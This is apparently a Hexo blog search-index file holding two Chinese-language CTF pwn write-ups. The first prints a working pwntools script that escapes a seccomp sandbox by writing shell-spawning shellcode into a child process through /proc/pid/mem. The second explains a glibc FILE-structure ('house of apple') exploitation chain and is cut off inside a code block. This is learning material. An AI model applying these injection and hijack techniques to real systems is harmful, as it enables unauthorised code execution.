<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>fork和proc文件</title>
    <link href="/post/fork-and-proc-files-1q6or4.html"/>
    <url>/post/fork-and-proc-files-1q6or4.html</url>
    
    <content type="html"><![CDATA[<h1 id="fork和proc文件"><a href="#fork和proc文件" class="headerlink" title="fork和proc文件"></a>fork和proc文件</h1><p>本来这一篇是打算放到持续更新的刷题记录里面的，但是感觉里面的知识点挺有学习得必要，所以还是单独再开了一篇博客</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>下面的就是程序代码</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251129115358-n40ouxn.png" alt="image"></p><p>很简单的一个题目，开了沙箱</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#  <span class="hljs-keyword">line</span>  CODE  JT   JF      K</span><br># =================================<br>#  <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br>#  <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br>#  <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br>#  <span class="hljs-number">0003</span>: <span class="hljs-number">0x35</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x40000000</span>  <span class="hljs-keyword">if</span> (A &lt; <span class="hljs-number">0x40000000</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0005</span><br>#  <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0xffffffff</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0xffffffff</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br>#  <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br>#  <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000013</span>  <span class="hljs-keyword">if</span> (A == readv) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br>#  <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000002a</span>  <span class="hljs-keyword">if</span> (A == connect) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br>#  <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000039</span>  <span class="hljs-keyword">if</span> (A == fork) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br>#  <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000142</span>  <span class="hljs-keyword">if</span> (A == execveat) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br>#  <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br>#  <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL<br></code></pre></td></tr></table></figure><p>本来可以用orw直接做的，但是看到一个脚本可以直接获取shell，大为震惊，打算学习一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">#!/usr/bin/env python3<br><br>from pwn import *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br>p = process(<span class="hljs-string">&#x27;./ezpwn&#x27;</span>)<br><br>p.recvuntil(b<span class="hljs-string">&#x27;pid: &#x27;</span>)<br>pid = <span class="hljs-type">int</span>(p.recvline())<br><br>sc1 = <span class="hljs-keyword">asm</span>(shellcraft.sh())<br><br>sc = (<br>    shellcraft.open(b<span class="hljs-string">&#x27;/proc/%d/mem&#x27;</span> % pid, <span class="hljs-number">2</span>) +<br>    shellcraft.pwrite(<span class="hljs-number">3</span>, sc1, len(sc1), <span class="hljs-number">0x401394</span>) +<br>    shellcraft.close(<span class="hljs-number">3</span>) +<br>    <span class="hljs-string">&#x27;\n_m: jmp _m&#x27;</span><br>    <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">)</span><br><span class="hljs-string"></span><br><span class="hljs-string">p.send(asm(sc))</span><br><span class="hljs-string"></span><br><span class="hljs-string">p.interactive()</span><br></code></pre></td></tr></table></figure><p>‍</p><h2 id="关于fork"><a href="#关于fork" class="headerlink" title="关于fork"></a>关于fork</h2><p>我对fork其实不算陌生，当时在学习绕过canary接触过fork，但是也仅限于知道fork会复制主进程的所有内容。所以在开始研究这道题目的时候，我对fork产生了一点小小的疑问，比如：我以为fork产生的是线程，因为我线程中的内容是共享的（我的错误认知）</p><p>fork是 UNIX&#x2F;POSIX 系统提供的系统调用，用于创建一个子进程。调用它之后我们会拥有两个进程：<br>一个是原来的——父进程；另一个是复制品——子进程。</p><p>这两个进程会从 <code>fork()</code> 的那一行之后继续执行同一段代码，但它们的“返回值”不同：</p><ul><li>在父进程中，<code>fork()</code> 返回子进程的 PID。</li><li>在子进程中，<code>fork()</code> 返回 0。</li><li>如果分裂失败，它只会在父进程中返回 -1，表示失败，没有子进程产生。</li></ul><p>两个进程都有各自的地址空间，但初始时是“写时复制”。也就是说，在真正写之前，它们共享同一份物理内存。如果某个进程试图修改某个内存页，系统才会复制该页给它。</p><h2 id="proc文件"><a href="#proc文件" class="headerlink" title="proc文件"></a>proc文件</h2><p>之前做题的时候从来没有使用过pid，所以这道题目当时就算输出了pid我都没有考虑</p><p>在我们的linux根目录的文件里面，有一个&#x2F;proc文件夹</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251130203748-y293rn0.png" alt="image"></p><p>进入到这个文件家里面，我们可以看到一些文件和一些数字</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251130203838-22tlqop.png" alt="image"></p><p>这些数字就是pid</p><p>我们可以通过访问这些数字文件夹里面的各个文件，获取一个程序运行中的各个程序</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251130204046-qrrk9j2.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251130204139-22wjysx.png" alt="image"></p><p>我询问过ai，为什么会存在这个proc文件夹，ai给我的解释是，作为调试的接口（我觉得很有道理，于是我接受了这个说法）</p><p>这些文件里面保存了一个程序运行的所有信息，包括什么地址所存储的内容，而且只要是相同uid的程序可以对此进行修改</p><h2 id="题目思路"><a href="#题目思路" class="headerlink" title="题目思路"></a>题目思路</h2><p>到此为止，这道题目的获取shell的脚本思路就很容易明白了——进程注入。</p><p>题目给了我们子进程的pid，又有可以任意代码执行的地方，我们就可以打开&#x2F;porc&#x2F;(pid)&#x2F;men这个文件，在这个程序里面选择一个接下来会执行到的地址进行覆盖；而且sandbox只存在于主进程中，子进程没有sandbox，那么我们就可以在子进程中写入shellcraft.sh()获取shell权限</p><p>虽然这道题目很简单，给的信息也很多，但是感觉得很了解linux的性质才能想到这种做法，比如我，了解的不深入，就完全不知道还能够有这样的方式去做，最多就只能想到orw了。</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>技术学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>今天还没pwn吗</title>
    <link href="/post/haven-t-pwned-yet-today-1ucsvd.html"/>
    <url>/post/haven-t-pwned-yet-today-1ucsvd.html</url>
    
    <content type="html"><![CDATA[<h1 id="今天还没pwn吗"><a href="#今天还没pwn吗" class="headerlink" title="今天还没pwn吗"></a>今天还没pwn吗</h1><p>每次都是比赛前临时突击刷题，导致每次比赛都很害怕，所以以后打算每天都拿出一点点时间刷一道题。（<del>实际是清理一下之前只保存却没有做的题</del>）</p><p>题目附件我会放到我的github仓库，想要的师傅可以自取<a href="https://github.com/N1mbus-lock/pwn">https://github.com/N1mbus-lock/pwn</a></p><h2 id="2025-11-17-20——2025强网杯bph"><a href="#2025-11-17-20——2025强网杯bph" class="headerlink" title="2025.11.17-20——2025强网杯bph"></a>2025.11.17-20——2025强网杯bph</h2><p>个人感觉这道题还是很不错的</p><p>漏洞点：可以在token泄露地址，存在一个任意地址写\x00</p><p>利用：可以通过任意地址置零设置stdin结构体的_IO_buf_base字段末尾为0，然后我们就可以通过输入覆盖_IO_buf_base和_IO_buf_end字段来控制我们写入的地址，选择覆盖stdout结构体来打house of apple加上通过setcontext实现orw</p><p>很爽了，做这道题的时候这些知识点虽然都知道，但是却几乎没有实践过，懂得很模糊</p><p>有一个点很疑惑，就是通过修改_IO_buf_base末尾为0。为什么可以导致写入，为什么之前的_IO_buf_base不能够写入到stdin结构体。（可以看<a href="https://bbs.kanxue.com/thread-261914.htm">https://bbs.kanxue.com/thread-261914.htm</a>）</p><p>然后我就去看写入前和写入后有什么区别</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251117162241-nytms21.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251117162412-bs85xdi.png" alt="image"></p><p>修改之后可以导致在0x00007f3395af2900和0x00007f3395af2964之间填入数据</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251117162536-b59w1cc.png" alt="image"></p><p>这两个字段控制的是缓冲区大小，因为我们平时做题的代码都会设置无缓冲，所以缓冲区设置的是1，输入会从键盘到显示框里。当不为1的时候键盘输入就存在了缓冲区里，这时候再修改缓冲区就可以再指定任意地址写了</p><p>看了一份wp，打的是puts触发的，看了好久，想不明白为什么要这么写，只能根据wp调试反推一下了</p><p>进入到了puts函数里面，一直按s，可以看到进入到了这个函数里面_IO_wfile_xsputn</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251120083517-jjc9cm0.png" alt="image"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_wfile_xsputn (FILE *f, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> n)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span> *s = (<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span> *) data;<br>  <span class="hljs-type">size_t</span> to_do = n;<br>  <span class="hljs-type">int</span> must_flush = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">size_t</span> count;<br><br>  <span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">/* This is an optimized implementation.</span><br><span class="hljs-comment">     If the amount to be written straddles a block boundary</span><br><span class="hljs-comment">     (or the filebuf is unbuffered), use sys_write directly. */</span><br><br>  <span class="hljs-comment">/* First figure out how much space is available in the buffer. */</span><br>  count = f-&gt;_wide_data-&gt;_IO_write_end - f-&gt;_wide_data-&gt;_IO_write_ptr;<br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123;<br>      count = f-&gt;_wide_data-&gt;_IO_buf_end - f-&gt;_wide_data-&gt;_IO_write_ptr;<br>      <span class="hljs-keyword">if</span> (count &gt;= n)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span> *p;<br>  <span class="hljs-keyword">for</span> (p = s + n; p &gt; s; )<br>    &#123;<br>      <span class="hljs-keyword">if</span> (*--p == <span class="hljs-string">L&#x27;\n&#x27;</span>)<br>&#123;<br>  count = p - s + <span class="hljs-number">1</span>;<br>  must_flush = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">break</span>;<br>&#125;<br>    &#125;<br>&#125;<br>    &#125;<br>  <span class="hljs-comment">/* Then fill the buffer. */</span><br>  <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (count &gt; to_do)<br>count = to_do;<br>      <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">20</span>)<br>&#123;<br>  f-&gt;_wide_data-&gt;_IO_write_ptr =<br>    __wmempcpy (f-&gt;_wide_data-&gt;_IO_write_ptr, s, count);<br>  s += count;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-type">wchar_t</span> *p = f-&gt;_wide_data-&gt;_IO_write_ptr;<br>  <span class="hljs-type">int</span> i = (<span class="hljs-type">int</span>) count;<br>  <span class="hljs-keyword">while</span> (--i &gt;= <span class="hljs-number">0</span>)<br>    *p++ = *s++;<br>  f-&gt;_wide_data-&gt;_IO_write_ptr = p;<br>&#125;<br>      to_do -= count;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (to_do &gt; <span class="hljs-number">0</span>)<br>    to_do -= _IO_wdefault_xsputn (f, s, to_do);<br>  <span class="hljs-keyword">if</span> (must_flush<br>      &amp;&amp; f-&gt;_wide_data-&gt;_IO_write_ptr != f-&gt;_wide_data-&gt;_IO_write_base)<br>    _IO_wdo_write (f, f-&gt;_wide_data-&gt;_IO_write_base,<br>   f-&gt;_wide_data-&gt;_IO_write_ptr<br>   - f-&gt;_wide_data-&gt;_IO_write_base);<br><br>  <span class="hljs-keyword">return</span> n - to_do;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为wp里面伪造了flag导致不会进入<code>if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</code>并且f-&gt;_wide_data-&gt;_IO_write_end &#x3D;0，f-&gt;_wide_data-&gt;_IO_write_ptr&#x3D;0，导致缓冲区肯定写不下to_do</p><p>所以进入到一下分支</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (to_do &gt; <span class="hljs-number">0</span>)<br>   to_do -= _IO_wdefault_xsputn (f, s, to_do);<br></code></pre></td></tr></table></figure><p>进行调用这个函数_IO_wdefault_xsputn</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251120091656-xu1nosh.png" alt="image"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_wdefault_xsputn (FILE *f, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> n)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span> *s = (<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span> *) data;<br>  <span class="hljs-type">size_t</span> more = n;<br>  <span class="hljs-keyword">if</span> (more &lt;= <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br>      <span class="hljs-comment">/* Space available. */</span><br>      <span class="hljs-type">ssize_t</span> count = (f-&gt;_wide_data-&gt;_IO_write_end<br>                       - f-&gt;_wide_data-&gt;_IO_write_ptr);<br>      <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>)<br>&#123;<br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">size_t</span>) count &gt; more)<br>    count = more;<br>  <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">20</span>)<br>    &#123;<br>      f-&gt;_wide_data-&gt;_IO_write_ptr =<br>__wmempcpy (f-&gt;_wide_data-&gt;_IO_write_ptr, s, count);<br>      s += count;<br>            &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">0</span>)<br>    count = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-type">wchar_t</span> *p = f-&gt;_wide_data-&gt;_IO_write_ptr;<br>      <span class="hljs-type">ssize_t</span> i;<br>      <span class="hljs-keyword">for</span> (i = count; --i &gt;= <span class="hljs-number">0</span>; )<br>*p++ = *s++;<br>      f-&gt;_wide_data-&gt;_IO_write_ptr = p;<br>            &#125;<br>  more -= count;<br>        &#125;<br>    <span class="hljs-keyword">if</span> (more == <span class="hljs-number">0</span> || __woverflow (f, *s++) == WEOF)<br><span class="hljs-keyword">break</span>;<br>      more--;<br>    &#125;<br>  <span class="hljs-keyword">return</span> n - more;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为cout还是等于0，所以只能执行到这if (more  ** 0 || __woverflow (f, *s++) **  WEOF)，而这里就是调用跳转表里面的<code>_IO_OVERFLOW</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">__woverflow (FILE *f, <span class="hljs-type">wint_t</span> wch)<br>&#123;<br>  <span class="hljs-keyword">if</span> (f-&gt;_mode == <span class="hljs-number">0</span>)<br>    _IO_fwide (f, <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">return</span> _IO_OVERFLOW (f, wch);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251120094643-wbx2nzh.png" alt="image"></p><p>这个函数在跳转表里面偏移18的位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_wfile_overflow (FILE *f, <span class="hljs-type">wint_t</span> wch)<br>&#123;<br>  <span class="hljs-keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="hljs-comment">/* SET ERROR */</span><br>    &#123;<br>      f-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> WEOF;<br>    &#125;<br>  <span class="hljs-comment">/* If currently reading or no buffer allocated. */</span><br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="hljs-number">0</span><br>      || f-&gt;_wide_data-&gt;_IO_write_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Allocate a buffer if needed. */</span><br>      <span class="hljs-keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="hljs-number">0</span>)<br>&#123;<br>  _IO_wdoallocbuf (f);<br>  _IO_free_wbackup_area (f);<br>  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,<br>     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);<br><br>  <span class="hljs-keyword">if</span> (f-&gt;_IO_write_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      _IO_doallocbuf (f);<br>      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);<br>    &#125;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-comment">/* Otherwise must be currently reading.  If _IO_read_ptr</span><br><span class="hljs-comment">     (and hence also _IO_read_end) is at the buffer end,</span><br><span class="hljs-comment">     logically slide the buffer forwards one block (by setting</span><br><span class="hljs-comment">     the read pointers to all point at the beginning of the</span><br><span class="hljs-comment">     block).  This makes room for subsequent output.</span><br><span class="hljs-comment">     Otherwise, set the read pointers to _IO_read_end (leaving</span><br><span class="hljs-comment">     that alone, so it can continue to correspond to the</span><br><span class="hljs-comment">     external position). */</span><br>  <span class="hljs-keyword">if</span> (f-&gt;_wide_data-&gt;_IO_read_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)<br>    &#123;<br>      f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;<br>      f-&gt;_wide_data-&gt;_IO_read_end = f-&gt;_wide_data-&gt;_IO_read_ptr =<br>f-&gt;_wide_data-&gt;_IO_buf_base;<br>    &#125;<br>&#125;<br>      f-&gt;_wide_data-&gt;_IO_write_ptr = f-&gt;_wide_data-&gt;_IO_read_ptr;<br>      f-&gt;_wide_data-&gt;_IO_write_base = f-&gt;_wide_data-&gt;_IO_write_ptr;<br>      f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_buf_end;<br>      f-&gt;_wide_data-&gt;_IO_read_base = f-&gt;_wide_data-&gt;_IO_read_ptr =<br>f-&gt;_wide_data-&gt;_IO_read_end;<br><br>      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;<br>      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;<br>      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;<br>      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;<br><br>      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;<br>      <span class="hljs-keyword">if</span> (f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))<br>f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_write_ptr;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (wch == WEOF)<br>    <span class="hljs-keyword">return</span> _IO_do_flush (f);<br>  <span class="hljs-keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)<br>    <span class="hljs-comment">/* Buffer is really full */</span><br>    <span class="hljs-keyword">if</span> (_IO_do_flush (f) == EOF)<br>      <span class="hljs-keyword">return</span> WEOF;<br>  *f-&gt;_wide_data-&gt;_IO_write_ptr++ = wch;<br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)<br>      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; wch == <span class="hljs-string">L&#x27;\n&#x27;</span>))<br>    <span class="hljs-keyword">if</span> (_IO_do_flush (f) == EOF)<br>      <span class="hljs-keyword">return</span> WEOF;<br>  <span class="hljs-keyword">return</span> wch;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到这里，当_IO_write_base&#x3D;0的时候，就会调用_IO_wdoallocbuf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="hljs-number">0</span>)<br>&#123;<br>  _IO_wdoallocbuf (f);<br></code></pre></td></tr></table></figure><p>然后进入到_IO_wdoallocbuf之后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>_IO_wdoallocbuf (FILE *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)<br>    <span class="hljs-keyword">return</span>;<br>  <span class="hljs-keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)<br>      <span class="hljs-keyword">return</span>;<br>  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,<br>     fp-&gt;_wide_data-&gt;_shortbuf + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>而这里会调用p-&gt;wide_data-&gt;vtable指向的跳转表，而这个没有检查跳转表是不是在规定的区间，所以可以修改为我们自己想要的值</p><p>（然后我看的这份wp，因为极致的空间利用，导致某些部分有些重合，所以一直没看懂，只能这么一步一步的调试过来看QwQ）</p><p>wp就是下面这样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 